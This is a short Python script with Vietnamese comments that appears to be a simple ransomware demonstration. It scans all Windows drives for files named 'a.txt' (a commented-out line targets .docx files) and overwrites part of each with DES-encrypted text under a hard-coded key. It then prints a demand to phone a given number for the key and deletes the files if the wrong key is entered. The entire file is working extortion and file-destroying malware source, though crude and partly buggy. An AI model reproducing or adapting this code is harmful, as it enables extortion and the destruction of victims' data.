




import string, os, shutil
from ctypes import windll
import sys

import DES

# lấy path và thêm vào một file 
def get_drives(): 
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1
    return drives
drives = get_drives()


pathfiles=[]


for i in drives:
    src_dir = i + ':\\'
    filePath = ''
    for dirpath, subdirs, files in os.walk(src_dir):
        for x in files:
            #  if x.endswith(".docx"): 
            if x=='a.txt':
                pathfiles.append(os.path.join(dirpath, x))


for i in pathfiles:
    print (i,end='\n')




# mã hóa 
key="anhtuan"
for i in pathfiles:
   
    try:
        with open(i,"r") as infile:
            nd= infile.read(16)
        
        nd_mh = DES.des_encrypt(nd,key)
        with open(i ,"w") as outfile:
            outfile.write(nd_mh)
             
    except shutil.SameFileError:
        pass

# # giải mã
print("Liên hệ 0399020331 để lấy key\n")
keyworld= input("Nhap key de mo khoa ")
test=False
dem=0



 
if (keyworld=="anhtuan"):
    for i in pathfiles:
        with open(i,"r") as infile:
            nd_mh= infile.read()
       
        nd_gm = DES.des_decrypt(str(nd_mh),key)
        with open(i ,"w") as outfile:
            outfile.write(nd_gm)

else:
    for file in pathfiles:
           os.remove(file)